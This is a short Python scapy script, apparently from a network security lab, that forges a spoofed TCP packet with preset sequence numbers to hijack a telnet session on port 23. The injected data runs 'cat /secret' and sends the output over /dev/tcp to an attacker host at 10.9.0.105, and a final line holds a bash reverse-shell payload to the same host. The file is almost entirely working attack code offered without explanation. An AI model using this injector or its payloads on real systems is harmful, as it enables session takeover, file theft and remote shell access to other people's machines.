import sys
from scapy.all import *


print("Send Hijacking Packet")
IPLayer = IP(src="10.9.0.5", dst="10.9.0.69")
TCPLayer = TCP(sport = 33758, dport = 23, flags="A",
               seq=367870381, ack = 715492795)
Data = "\r cat /secret > /dev/tcp/10.9.0.105/9090\r"
pkt = IPLayer/TCPLayer/Data
send(pkt, verbose=0, iface='eth0')



Data = "\r /bin/bash -i > /dev/tcp/10.9.0.105/9090 2>&1 0<&1 \r"